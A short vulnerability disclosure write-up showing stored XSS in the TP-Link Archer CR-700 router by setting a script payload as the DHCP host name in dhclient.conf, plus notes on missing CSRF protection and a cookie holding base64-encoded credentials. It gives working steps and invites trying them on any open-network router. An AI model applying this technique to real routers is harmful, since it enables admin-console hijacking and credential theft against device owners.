Exploiting TP-Link Archer CR-700 Router. (Responsibly Disclosed to TP-Link)

Step 1-> On you linux machine (Kali or Ubuntu) type the following command

gedit /etc/dhcp/dhclient.conf

Comment out the line below
send host-name = gethostname();

Copy it to the line below it and change the gethostname() function to an XSS script like below.

send host-name = "<script>alert(5)</script>";

Step 2:Restart your linux system so that the changes takes into effect.

Step 3: Send a DHCP request to the router to receive an IP address with the command below.(Try this on any open network routers which is using TP-Link Archer CR-700)

dhclient -v -i wlan0

On running the command above, it send a DHCP request to the router. On a DHCP request, the host name is sent to which we have forcibly set it to an XSS script <script>alert(5)</script>

Step 4: Login to the administrator console.

On logging in the Script executes.

One more issue that I saw in the router that was that there was no CSRF token. The cookie set by the router contains a base64 encoded username & password whcih can be stolen using an XSS script.

Note:All The above information has been disclosed to TP-Link, who have reporduced the problem and passed it to their R&D team to fix the issue.
